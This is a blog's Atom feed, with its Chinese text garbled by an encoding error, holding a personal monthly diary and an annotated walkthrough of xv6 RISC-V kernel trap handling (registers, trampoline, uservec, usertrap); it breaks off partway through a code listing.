<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Humoooor&#39;s Blog</title>
  
  
  <link href="https://humoooor.cn/atom.xml" rel="self"/>
  
  <link href="https://humoooor.cn/"/>
  <updated>2023-07-01T04:28:36.106Z</updated>
  <id>https://humoooor.cn/</id>
  
  <author>
    <name>Humoooor</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2023.06</title>
    <link href="https://humoooor.cn/2023/06/05/2023.06/"/>
    <id>https://humoooor.cn/2023/06/05/2023.06/</id>
    <published>2023-06-05T03:04:00.000Z</published>
    <updated>2023-07-01T04:28:36.106Z</updated>
    
    <content type="html"><![CDATA[<p>å­¦ä¹ çš„å…­æœˆ</p><span id="more"></span><h2 id="Week-9-2023-06-01-2023-06-04"><a href="#Week-9-2023-06-01-2023-06-04" class="headerlink" title="Week 9 (2023.06.01 - 2023.06.04)"></a>Week 9 (2023.06.01 - 2023.06.04)</h2><p>æœ¬æ¥æƒ³ç€çœ‹ xv6 çš„è§†é¢‘ï¼Œç»“æœçœ‹ç€çœ‹ç€ï¼Œè·‘å»çœ‹çº¿ç¨‹åˆ‡æ¢çš„æºç äº†ï¼Œç®—æ˜¯åŸºæœ¬ææ‡‚äº†åŸç†</p><p>æŠŠè®¡ç½‘å’Œé€šåŸå®éªŒåšå®Œäº†ï¼Œè¿˜æŒºæœ‰æ„æ€ï¼ˆç¬‘ï¼‰</p><p>ğŸ“ 75 åˆ†ï¼Œç•¥ä½ ğŸ˜°</p><p>ä¸‹å‘¨æœŸæœ›</p><ul><li>å®Œæˆå†…å®¹å®‰å…¨å’Œæ™ºèƒ½ç»ˆç«¯å®‰å…¨ä½œä¸š</li><li>å¼€å§‹é¢„ä¹ </li></ul><h2 id="Week-10-2023-06-05-2023-06-11"><a href="#Week-10-2023-06-05-2023-06-11" class="headerlink" title="Week 10 (2023.06.05 - 2023.06.11)"></a>Week 10 (2023.06.05 - 2023.06.11)</h2><p>å’Œ Jam å¤ä¹ åè®®å’Œè½¯ä»¶ï¼ŒJam å¥½å¼º</p><h2 id="Week-11-2023-06-12-2023-06-18"><a href="#Week-11-2023-06-12-2023-06-18" class="headerlink" title="Week 11 (2023.06.12 - 2023.06.18)"></a>Week 11 (2023.06.12 - 2023.06.18)</h2><p>è€ƒå®Œåè®®å’Œè½¯ä»¶äº†æ</p><p>è¿™ b AI å®éªŒæˆ‘æ˜¯ä¸€è¾ˆå­ä¸æƒ³å†åšäº†ï¼ˆ<del>ä»€ä¹ˆ b è¯¾éƒ½æ¥è¹­ AIï¼Œç¬‘</del>ï¼‰</p><p>æ¢æ‰‹æœºäº†ï¼ŒèŠœæ¹–</p><h2 id="Week-12-2023-06-19-2023-06-25"><a href="#Week-12-2023-06-19-2023-06-25" class="headerlink" title="Week 12 (2023.06.19 - 2023.06.25)"></a>Week 12 (2023.06.19 - 2023.06.25)</h2><p>äººå·¥æ™ºèƒ½å¤ä¹ åŠå°æ—¶ï¼Œè€ƒè¯•åŠå°æ—¶ï¼ˆä¹ï¼‰</p><p>å‡ºå»å’Œå¯¹è±¡ç©è€ï¼Œæ‹äº†å¥½å¤šç…§ç‰‡ï¼Œå¥½å¥½çœ‹ğŸ¥°</p><h2 id="Week-13-2023-06-26-2023-06-30"><a href="#Week-13-2023-06-26-2023-06-30" class="headerlink" title="Week 13 (2023.06.26 - 2023.06.30)"></a>Week 13 (2023.06.26 - 2023.06.30)</h2><p>å›é«˜ä¸­çœ‹æœ›ç­ä¸»ä»»ï¼ŒèŠäº†å¾ˆå¤šï¼Œå¼€å¿ƒæ</p><p>å»â€ä¸Šç­äº†ï¼</p><ul><li>å…¥èŒï¼šå¥½æ¿€åŠ¨</li><li>ä¸Šç­ç¬¬ä¸€å¤©ï¼šä»€ä¹ˆæ—¶å€™ä¸‹ç­</li></ul><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><ul><li>è€ƒè¯•æå®šäº†</li><li>å®ä¹ æœ‰ç€è½äº†</li><li>é«˜ä¸­æ¯•ä¸šä»¥æ¥ç¬¬ä¸€æ¬¡å»çœ‹è€å¸ˆ</li></ul><h2 id="æœŸæœ›"><a href="#æœŸæœ›" class="headerlink" title="æœŸæœ›"></a>æœŸæœ›</h2><ul><li>å®ä¹ å¥½å¥½å¹²ï¼Œå¤šå­¦å®¹å™¨å®‰å…¨</li><li>xv6 ç»§ç»­çœ‹ï¼Œå‰–æç±» Unix å†…æ ¸æºç ï¼ˆè¿›é˜¶ï¼šLinux å†…æ ¸æºç ï¼‰</li><li>èº«ä½“å¥åº·æœ€é‡è¦ï¼Œæ—©ç¡æ—©èµ·</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;å­¦ä¹ çš„å…­æœˆ&lt;/p&gt;</summary>
    
    
    
    <category term="MonthReport" scheme="https://humoooor.cn/categories/MonthReport/"/>
    
    
  </entry>
  
  <entry>
    <title>Xv6 å‰–æ</title>
    <link href="https://humoooor.cn/2023/05/23/Xv6%20%E5%89%96%E6%9E%90/"/>
    <id>https://humoooor.cn/2023/05/23/Xv6%20%E5%89%96%E6%9E%90/</id>
    <published>2023-05-23T03:21:00.000Z</published>
    <updated>2023-06-01T12:32:30.182Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸ªäººå¯¹ xv6 è¿™ä¸ªç®€æ˜“æ“ä½œç³»ç»Ÿå†…æ ¸æ¯”è¾ƒæ„Ÿå…´è¶£ï¼Œå°±æƒ³å†™ä¸€ä¸ªå‰–æï¼Œçœ‹çœ‹ xv6 éƒ½æ˜¯æ€ä¹ˆå®ç°è¿™äº›åŠŸèƒ½çš„ï¼ŒåšæŒä¸€å‘¨æ›´ä¸€ä¸ªè¯é¢˜</p><span id="more"></span><h2 id="é¢„å¤‡çŸ¥è¯†"><a href="#é¢„å¤‡çŸ¥è¯†" class="headerlink" title="é¢„å¤‡çŸ¥è¯†"></a>é¢„å¤‡çŸ¥è¯†</h2><p>å¯ä»¥ç›´æ¥è¯»ä¸‹é¢çš„è¯é¢˜ï¼Œè¿™é‡Œæ˜¯ä¾¿äºè¯»æ­¤æ–‡ç« æ—¶å¿«é€Ÿäº†è§£</p><h3 id="å…³äº-xv6"><a href="#å…³äº-xv6" class="headerlink" title="å…³äº xv6"></a>å…³äº xv6</h3><p>xv6 æ˜¯ä¸€ä¸ªåŸºäº RISC-V 64 ä½æ¶æ„ CPU çš„ç±» Unix ç®€æ˜“æ“ä½œç³»ç»Ÿ</p><h3 id="å¯„å­˜å™¨"><a href="#å¯„å­˜å™¨" class="headerlink" title="å¯„å­˜å™¨"></a>å¯„å­˜å™¨</h3><h4 id="é€šç”¨å¯„å­˜å™¨"><a href="#é€šç”¨å¯„å­˜å™¨" class="headerlink" title="é€šç”¨å¯„å­˜å™¨"></a>é€šç”¨å¯„å­˜å™¨</h4><table><thead><tr><th>Register</th><th>ABI Name</th><th>Description</th><th>Saver</th></tr></thead><tbody><tr><td>x0</td><td>zero</td><td>Hard-wired zero</td><td>-</td></tr><tr><td>x1</td><td>ra</td><td>Return address</td><td>Caller</td></tr><tr><td>x2</td><td>sp</td><td>Stack pointer</td><td>Callee</td></tr><tr><td>x3</td><td>gp</td><td>Global pointer</td><td>-</td></tr><tr><td>x4</td><td>tp</td><td>Thread pointer</td><td>-</td></tr><tr><td>x5-7</td><td>t0-2</td><td>Temporaries</td><td>Caller</td></tr><tr><td>x8</td><td>s0/fp</td><td>Saved register / frame pointer</td><td>Callee</td></tr><tr><td>x9</td><td>s1</td><td>Saved register</td><td>Callee</td></tr><tr><td>x10-x11</td><td>a0-1</td><td>Function arguments / return values</td><td>Caller</td></tr><tr><td>x12-x17</td><td>a2-7</td><td>Function arguments</td><td>Caller</td></tr><tr><td>x18-27</td><td>s2-11</td><td>Saved registers</td><td>Callee</td></tr><tr><td>x28-31</td><td>t3-6</td><td>Temporaries</td><td>Caller</td></tr></tbody></table><p>åœ¨æ±‡ç¼–ä¸­ä¸€èˆ¬ä½¿ç”¨å¯„å­˜å™¨çš„ ABI åå­—</p><p>è¿˜æœ‰ f å¼€å¤´çš„å¯„å­˜å™¨ï¼Œç”¨äºæµ®ç‚¹æ•°ï¼Œæ²¡æœ‰åˆ—ä¸¾å‡ºæ¥</p><p>ra ä¿å­˜å½“å‰å‡½æ•°çš„è¿”å›åœ°å€</p><p>s0/fpã€sp ç”¨äºä¿å­˜æ ˆåº•å’Œæ ˆé¡¶ï¼Œæ³¨æ„ s0 å’Œ fp æ˜¯åŒä¸€ä¸ªå¯„å­˜å™¨</p><p>tp ä¿å­˜å½“å‰ CPU æ ¸ id</p><p>a0 è¿˜ç”¨äºä¿å­˜å‡½æ•°è¿”å›å€¼</p><ul><li>Saver<ul><li>å‡½æ•°ä¹‹é—´é™¤äº† a0 å¯„å­˜å™¨ä¼ é€’è¿”å›å€¼å¤–ï¼Œåº”è¯¥ä¸èƒ½äº’ç›¸å½±å“ï¼Œå› æ­¤å…¶ä»–å¯„å­˜å™¨éœ€è¦è¢«ä¿å­˜ä¸‹æ¥ï¼ŒSaver æŒ‡å®šå½“å‰å‡½æ•°çš„å¯„å­˜å™¨æ˜¯ç”±è°ƒç”¨å‡½æ•°è¿˜æ˜¯è¢«è°ƒç”¨å‡½æ•°ä¿å­˜</li><li>Callerï¼šè°ƒç”¨å‡½æ•°<ul><li>Caller åœ¨å‡½æ•°å¼€å§‹å°±å¯ä»¥é€‰æ‹© Caller ç±»å¯„å­˜å™¨ä¿å­˜ä¸‹æ¥ï¼Œä¸€èˆ¬åªä¿å­˜ raï¼Œå…·ä½“ç”±ç¼–è¯‘å™¨é€‰æ‹©</li></ul></li><li>Calleeï¼šè¢«è°ƒç”¨å‡½æ•°<ul><li>Callee åªä¿å­˜å®ƒä¼šç”¨åˆ°çš„ Callee ç±»å¯„å­˜å™¨ï¼Œåœ¨è¿”å›åˆ° Caller å‰æ¢å¤</li></ul></li><li>ä¸ºä»€ä¹ˆè¦åˆ†å¼€ä¿å­˜å‘¢ï¼Ÿ<ul><li>Callee ç±»çš„å¯„å­˜å™¨ä¸èƒ½ç¡®å®šä¸‹å±‚å‡½æ•°ä¼šä¸ä¼šç”¨åˆ°ï¼Œè€Œä¸”éšæ—¶ä¼šå˜åŒ–ï¼Œæ¯æ¬¡è°ƒç”¨å‡½æ•°å‰åéƒ½å­˜å–ä¸€éï¼Œæ€§èƒ½ä¼šé™ä½å¾ˆå¤šï¼Œä¸ºäº†æé«˜æ€§èƒ½ï¼Œç”±è¢«è°ƒç”¨è€…æ¥ä¿å­˜æ›´åŠ åˆé€‚</li></ul></li></ul></li></ul><h4 id="æ§åˆ¶çŠ¶æ€å¯„å­˜å™¨"><a href="#æ§åˆ¶çŠ¶æ€å¯„å­˜å™¨" class="headerlink" title="æ§åˆ¶çŠ¶æ€å¯„å­˜å™¨"></a>æ§åˆ¶çŠ¶æ€å¯„å­˜å™¨</h4><p>CSRï¼ˆControl Status Registerï¼‰</p><ul><li>pcï¼šæŒ‡å‘ä¸‹ä¸€æ¡å°†è¦æŒ‡å‘æŒ‡ä»¤çš„åœ°å€<ul><li>Program Counter</li></ul></li><li>satpï¼šä¿å­˜ä¸€çº§é¡µè¡¨çš„ç‰©ç†åœ°å€<ul><li>Supervisor Address Translation and Protection</li></ul></li><li>stvecï¼šä¿å­˜å‘ç”Ÿ trap æ—¶è·³è½¬çš„åœ°å€<ul><li>Supervisor Trap Vector Base Address Register</li><li>ç”¨æˆ·æ¨¡å¼ä¸‹ä¼šæŒ‡å‘ kernel/trapmpoline.S çš„ <code>uservec</code></li><li>ç®¡ç†è€…æ¨¡å¼ä¸‹ä¼šæŒ‡å‘ kernel/kernelvec.S çš„ <code>kernelvec</code></li></ul></li><li>sepcï¼šä¿å­˜å‘ç”Ÿ trap æ—¶ pc çš„å€¼ï¼Œä¾¿äºè¿”å›åˆ°ç”¨æˆ·è¿›ç¨‹<ul><li>Supervisor Exception Program Counter</li><li>å†…æ ¸å¯æ§åˆ¶ sepc è®© sret è¿”å›åˆ°é€‚å½“çš„ä½ç½®</li></ul></li><li>scauseï¼šè®°å½•å‘ç”Ÿ trap çš„åŸå› ï¼Œå†…æ ¸æ ¹æ®è¿™ä¸ªåšè¿›ä¸€æ­¥å¤„ç†<ul><li>Supervisor Cause Register</li><li>8 è¡¨ç¤ºç³»ç»Ÿè°ƒç”¨</li><li>å…¶ä»–è¡¨ç¤ºé”™è¯¯æˆ–è€…ä¸­æ–­</li></ul></li><li>sstatusï¼šä»¥ bitmap å½¢å¼ä¿å­˜ä¸€äº›æ§åˆ¶ä¿¡æ¯<ul><li>Supervisor Status Register</li><li>SPPï¼šè¡¨ç¤º trap æ¥è‡ªç”¨æˆ·æ¨¡å¼è¿˜æ˜¯ç®¡ç†è€…æ¨¡å¼ï¼Œå¹¶ç”¨æ¥å‘Šè¯‰ sret è¿”å›åˆ°å“ªä¸ªæ¨¡å¼</li><li>SIEï¼šè¡¨ç¤ºåœ¨ç®¡ç†è€…æ¨¡å¼ä¸‹æ˜¯å¦å…è®¸è®¾å¤‡ä¸­æ–­ï¼Œ0 è¡¨ç¤ºç¦æ­¢ï¼ŒRISC-V ä¼šæ¨è¿Ÿè®¾å¤‡ä¸­æ–­</li></ul></li><li>sscatchï¼šåœ¨å†…æ ¸æ€ä¸ç”¨æˆ·æ€æ—¶èµ·è¾…åŠ©ä½œç”¨<ul><li>ä¸€èˆ¬ç”¨æ¥ä¿å­˜ a0</li><li><del>åœ¨ xv6 çš„ 2020 ç‰ˆæœ¬ç”¨æ¥ä¿å­˜ trapframe åœ°å€</del></li></ul></li></ul><h3 id="æ±‡ç¼–æŒ‡ä»¤"><a href="#æ±‡ç¼–æŒ‡ä»¤" class="headerlink" title="æ±‡ç¼–æŒ‡ä»¤"></a>æ±‡ç¼–æŒ‡ä»¤</h3><ul><li>csrrã€csrw<ul><li>ç”¨äºè¯»å†™ CSR</li></ul></li><li>sfence.vma<ul><li>æ¸…ç©º TLB ç¼“å­˜</li></ul></li><li>ecallï¼ˆEnvironment Callï¼‰<ol><li>å°†æ¨¡å¼ä»ç”¨æˆ·æ¨¡å¼æ›´æ”¹ä¸ºç®¡ç†è€…ï¼ˆsupervisorï¼‰æ¨¡å¼</li><li>å°† pc å¯„å­˜å™¨ä¿å­˜åˆ° sepc å¯„å­˜å™¨</li><li>å°† pc å¯„å­˜å™¨æ”¹ä¸º stvec å¯„å­˜å™¨å€¼</li><li>å…³é—­è®¾å¤‡ä¸­æ–­ï¼ˆå°† sstatus çš„ SIE ä½è®¾ä¸º 0ï¼‰</li></ol></li><li>sretï¼ˆSupervisor Returnï¼‰<ol><li>å°†æ¨¡å¼ä»ç®¡ç†è€…æ¨¡å¼æ›´æ”¹ä¸ºæŒ‡å®šçš„æ¨¡å¼ï¼ˆsstatus çš„ SPP ä½ï¼‰</li><li>å°† pc å¯„å­˜å™¨æ”¹ä¸º sepc å¯„å­˜å™¨å€¼</li><li>å¯ç”¨è®¾å¤‡ä¸­æ–­ï¼ˆå°† sstatus çš„ SIE ä½è®¾ä¸º 1ï¼‰</li></ol></li></ul><h3 id="åœ°å€ç©ºé—´"><a href="#åœ°å€ç©ºé—´" class="headerlink" title="åœ°å€ç©ºé—´"></a>åœ°å€ç©ºé—´</h3><ul><li>tramplineï¼šåœ¨å†…æ ¸é¡µè¡¨å’Œç”¨æˆ·é¡µè¡¨ä¸­éƒ½æœ‰æ˜ å°„ï¼Œä½œä¸ºç”¨æˆ·è¿›ç¨‹åˆ‡æ¢åˆ°å†…æ ¸çš„è·³æ¿ï¼Œæ”¾åœ¨è™šæ‹Ÿåœ°å€ç©ºé—´çš„é¡¶éƒ¨ï¼ˆ0x3ffffff000ï¼‰ï¼Œå¤§å°ä¸ºä¸€é¡µ</li><li>trapframeï¼šåœ¨ç”¨æˆ·é¡µè¡¨ä¸­æœ‰æ˜ å°„ï¼Œç”¨äºåˆ‡æ¢åˆ°å†…æ ¸æ—¶ä¿å­˜ç”¨æˆ·è¿›ç¨‹çš„ä¸Šä¸‹æ–‡ï¼Œæ”¾åœ¨ trampoline ä¸‹é¢ï¼ˆ0x3fffffe000ï¼‰ï¼Œå¤§å°ä¸ºä¸€é¡µ</li></ul><h3 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h3><figure class="highlight c"><figcaption><span>kernel/proc.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cpu</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">proc</span>;</span>          <span class="comment">// The process running on this cpu, or null.</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">context</span> <span class="title">context</span>;</span>     <span class="comment">// swtch() here to enter scheduler().</span></span><br><span class="line">  <span class="type">int</span> noff;                   <span class="comment">// Depth of push_off() nesting.</span></span><br><span class="line">  <span class="type">int</span> intena;                 <span class="comment">// Were interrupts enabled before push_off()?</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>proc<ul><li>ä¿å­˜å½“å‰ CPU æ ¸è¿è¡Œçš„è¿›ç¨‹</li></ul></li><li>context<ul><li>ä¿å­˜å†…æ ¸ç”¨äºè°ƒåº¦åŠŸèƒ½çš„çº¿ç¨‹çš„ä¸Šä¸‹æ–‡</li></ul></li></ul><h2 id="æ€ä¹ˆåœ¨å†…æ ¸å’Œç”¨æˆ·è¿›ç¨‹é—´åˆ‡æ¢"><a href="#æ€ä¹ˆåœ¨å†…æ ¸å’Œç”¨æˆ·è¿›ç¨‹é—´åˆ‡æ¢" class="headerlink" title="æ€ä¹ˆåœ¨å†…æ ¸å’Œç”¨æˆ·è¿›ç¨‹é—´åˆ‡æ¢"></a>æ€ä¹ˆåœ¨å†…æ ¸å’Œç”¨æˆ·è¿›ç¨‹é—´åˆ‡æ¢</h2><p>åœ¨ RISC-V ä¸­ï¼Œæœ‰ä¸‰ç§ trap</p><ul><li>ç³»ç»Ÿè°ƒç”¨</li><li>ç¡¬ä»¶ä¸­æ–­</li><li>å¼‚å¸¸</li></ul><p>åœ¨ç”¨æˆ·è¿›ç¨‹ä¸­å‘ç”Ÿ trap æ—¶ï¼Œéœ€è¦é™·å…¥åˆ°å†…æ ¸ä¸­è¿›è¡Œå¤„ç†ï¼Œå¤„ç†å®Œåå†…æ ¸ä¼šæ ¹æ®æƒ…å†µå›åˆ°ç”¨æˆ·è¿›ç¨‹æˆ–è€…æ€æ­»ç”¨æˆ·è¿›ç¨‹ï¼Œè¿™å…¶ä¸­å°±æ¶‰åŠåˆ°å†…æ ¸å’Œç”¨æˆ·è¿›ç¨‹é—´çš„åˆ‡æ¢</p><h3 id="åˆ‡æ¢è¿‡ç¨‹"><a href="#åˆ‡æ¢è¿‡ç¨‹" class="headerlink" title="åˆ‡æ¢è¿‡ç¨‹"></a>åˆ‡æ¢è¿‡ç¨‹</h3><p>å‘ç”Ÿ trap æ—¶ï¼Œç¡¬ä»¶ä¼šæ‰§è¡Œä»¥ä¸‹æ“ä½œ</p><ol><li>å°† sstatus ä¸­çš„ SIE ä½æ¸…é›¶ï¼Œç¦ç”¨è®¾å¤‡ä¸­æ–­ä»¥é˜²æ­¢å¹²æ‰°ï¼Œå¦‚æœè¿™ä¸ª trap æ˜¯è®¾å¤‡ä¸­æ–­ï¼Œä¸ä¼šåšä»¥ä¸‹æ“ä½œ</li><li>å°†æ¨¡å¼ä»ç”¨æˆ·æ¨¡å¼æ›´æ”¹ä¸ºç®¡ç†è€…æ¨¡å¼</li><li>å°† pc å¯„å­˜å™¨çš„å€¼å¤åˆ¶åˆ° sepc å¯„å­˜å™¨ä¸­</li><li>å°†å½“å‰æ¨¡å¼ï¼ˆç”¨æˆ·æˆ–è€…ç®¡ç†è€…ï¼‰ä¿å­˜åˆ° sstatus å¯„å­˜å™¨çš„ SPP ä½</li><li>è®¾ç½® scause å¯„å­˜å™¨çš„å€¼åæ˜  trap åŸå› </li><li>å°† stvec å¯„å­˜å™¨çš„å€¼å¤åˆ¶åˆ° pc å¯„å­˜å™¨ä¸­</li></ol><p>æ­¤æ—¶ pc æŒ‡å‘ trampolineï¼Œå¼€å§‹æ‰§è¡Œï¼Œæ³¨æ„ï¼Œæ­¤æ—¶é¡µè¡¨å¯„å­˜å™¨å¹¶æ²¡æœ‰ä¾¿ï¼Œä¹Ÿå°±æ˜¯è¯´è¿˜ä½¿ç”¨ç€ç”¨æˆ·è¿›ç¨‹çš„é¡µè¡¨</p><figure class="highlight x86asm"><figcaption><span>kernel/trapoline.S</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.globl</span> uservec</span><br><span class="line"><span class="symbol">uservec:</span></span><br><span class="line">        # ç¼“å­˜ a0</span><br><span class="line">        csrw sscratch, a0</span><br><span class="line"></span><br><span class="line">        # æŠŠ trapframe åœ°å€æ”¾åˆ° a0 ä¸­</span><br><span class="line">        li a0, TRAPFRAME</span><br><span class="line">        </span><br><span class="line">        # æŠŠç”¨æˆ·å¯„å­˜å™¨ä¿å­˜åˆ° trapframe ä¸­ï¼Œkernel/proc<span class="number">.</span>h ä¸­å¯¹åº”ç€å˜é‡åœ°å€</span><br><span class="line">        sd ra, <span class="number">40</span>(a0)</span><br><span class="line">        sd <span class="built_in">sp</span>, <span class="number">48</span>(a0)</span><br><span class="line">        # æ­¤å¤„çœç•¥...</span><br><span class="line">        sd t5, <span class="number">272</span>(a0)</span><br><span class="line">        sd t6, <span class="number">280</span>(a0)</span><br><span class="line"></span><br><span class="line">    # å†æŠŠåŸ a0 çš„å€¼ä¿å­˜è¿›å»</span><br><span class="line">        csrr t0, sscratch</span><br><span class="line">        sd t0, <span class="number">112</span>(a0)</span><br><span class="line"></span><br><span class="line">        # ä» trapframe ä¸­å–å‡ºå†…æ ¸æ ˆçš„æŒ‡é’ˆã€<span class="meta">CPU</span> æ ¸çš„ idã€å¤„ç† trap çš„åœ°å€ã€å†…æ ¸é¡µè¡¨</span><br><span class="line">        ld <span class="built_in">sp</span>, <span class="number">8</span>(a0)</span><br><span class="line">        ld tp, <span class="number">32</span>(a0)</span><br><span class="line">        ld t0, <span class="number">16</span>(a0)</span><br><span class="line">        ld t1, <span class="number">0</span>(a0)</span><br><span class="line"></span><br><span class="line">        # æ¸…ç©º TLB ç¼“å­˜ï¼Œè¿™é‡Œè‹±æ–‡æ³¨é‡Šæ˜¯è¯´</span><br><span class="line">        <span class="keyword">sfence</span><span class="number">.</span>vma <span class="meta">zero</span>, <span class="meta">zero</span></span><br><span class="line"></span><br><span class="line">        # åˆ‡æ¢åˆ°å†…æ ¸é¡µè¡¨</span><br><span class="line">        csrw satp, t1</span><br><span class="line"></span><br><span class="line">        # æ¸…ç©º TLB ç¼“å­˜</span><br><span class="line">        <span class="keyword">sfence</span><span class="number">.</span>vma <span class="meta">zero</span>, <span class="meta">zero</span></span><br><span class="line"></span><br><span class="line">        # è·³è½¬åˆ°å¤„ç† trap çš„åœ°æ–¹ï¼Œä¹Ÿå°±æ˜¯ kernel/trap<span class="number">.</span>c çš„ usertrap å‡½æ•°åœ°å€</span><br><span class="line">        jr t0</span><br></pre></td></tr></table></figure><p>æ€»ç»“ï¼š</p><ol><li>å°†ç”¨æˆ·è¿›ç¨‹çš„å¯„å­˜å™¨ä¿å­˜åˆ° trapframe ä¸­</li><li>åˆ‡æ¢å†…æ ¸æ ˆï¼Œå†…æ ¸çº¿ç¨‹ idï¼Œå†…æ ¸é¡µè¡¨</li><li>è·³è½¬åˆ° kernel/trap.c çš„ <code>usertrap</code> å‡½æ•°</li></ol><p><code>uservec</code> ä¸»è¦å°±æ˜¯åšå¥½åˆ‡æ¢åˆ°å†…æ ¸çš„å‡†å¤‡</p><figure class="highlight c"><figcaption><span>kernel/trap.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">usertrap</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// è®¾ç½® stvec ä¸º kernelvecï¼Œå¦‚æœæ­¤æ—¶å‘ç”Ÿäº† trap ä¼šè·³è½¬åˆ° kernelvec è¿›è¡Œå¤„ç†</span></span><br><span class="line">  w_stvec((uint64)kernelvec);</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// ä¿å­˜ç”¨æˆ·è¿›ç¨‹çš„ pc åˆ° trapframe</span></span><br><span class="line">  p-&gt;trapframe-&gt;epc = r_sepc();</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(r_scause() == <span class="number">8</span>)&#123;</span><br><span class="line">    <span class="comment">// ç³»ç»Ÿè°ƒç”¨</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>((which_dev = devintr()) != <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="comment">// è®¾å¤‡ä¸­æ–­</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// å…¶ä»–å¼‚å¸¸</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å¦‚æœç”¨æˆ·è¿›ç¨‹è¢«æ€æ­»å°±é€€å‡º</span></span><br><span class="line">  <span class="keyword">if</span>(killed(p))</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å¦‚æœæ˜¯è®¡æ—¶å™¨ä¸­æ–­ï¼Œåˆ™è¿›è¡Œè¿›ç¨‹è°ƒåº¦</span></span><br><span class="line">  <span class="keyword">if</span>(which_dev == <span class="number">2</span>)</span><br><span class="line">    yield();</span><br><span class="line"></span><br><span class="line">  usertrapret();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ€»ç»“ï¼š</p><ol><li>æŠŠ stvec æ”¹æˆ kernelvec ä»¥å¤„ç†å‘ç”Ÿåœ¨å†…æ ¸çš„ trap</li><li>ä¿å­˜ç”¨æˆ·è¿›ç¨‹çš„ pc åˆ° trapframe</li><li>æ ¹æ® scauseã€devintr å¤„ç† trap</li><li>æ£€æŸ¥æ˜¯å¦è®¡æ—¶å™¨ä¸­æ–­ï¼Œè‹¥æ˜¯åˆ™è¿›è¡Œè¿›ç¨‹è°ƒåº¦</li><li>æ£€æŸ¥è¿›ç¨‹æ˜¯å¦è¢«æ€æ­»ï¼Œè‹¥æ˜¯åˆ™é€€å‡º</li><li>è·³è½¬åˆ° <code>usertrapret</code> å‡½æ•°</li></ol><p><code>usertrap</code> ä¸»è¦å°±æ˜¯æ ¹æ® trap ç±»å‹å¤„ç† trap</p><figure class="highlight c"><figcaption><span>kernel/trap.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 